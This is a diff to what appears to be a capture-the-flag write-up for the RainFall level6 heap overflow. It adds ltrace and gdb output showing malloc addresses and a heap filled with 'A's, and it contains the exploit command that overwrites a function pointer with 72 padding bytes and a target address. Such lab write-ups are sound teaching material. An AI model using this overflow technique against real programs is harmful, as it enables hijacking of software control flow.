@@ -9,8 +9,44 @@ Because the `char* dest` is located before our function pointer in memory, we ca
 
 As we can see, the strcpy copies over the entire argv[1].
 
+
+We can get the addresses from malloc by running `ltrace`.
+```shell
+level6@RainFall:~$ ltrace ./level6 
+__libc_start_main(0x804847c, 1, 0xbffff7f4, 0x80484e0, 0x8048550 <unfinished ...>
+malloc(64)                                                      = 0x0804a008
+malloc(4)                                                       = 0x0804a050
+strcpy(0x0804a008, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+level6@RainFall:~$ 
+```
+
+```shell
+level6@RainFall:~$ gdb -q level6 
+Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
+(gdb) b *main+78
+Breakpoint 1 at 0x80484ca
+(gdb) run $(python -c 'print 72*"A"')
+Starting program: /home/user/level6/level6 $(python -c 'print 72*"A"')
+
+Breakpoint 1, 0x080484ca in main ()
+(gdb) x/40x 0x0804a008
+0x804a008:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a048:	0x41414141	0x41414141	0x08048400	0x00000000
+0x804a058:	0x00000000	0x00020fa9	0x00000000	0x00000000
+0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) 
+```
+
+
 ```shell
 level6@RainFall:~$ ./level6 $(python -c 'print 72 * "A" + "\x54\x84\x04\x08"')
 [...]
 ```
-I just don't yet understand why I can't print 64 A's, why it has to be 72. Probably padding but that is just my guess unless im missing something.
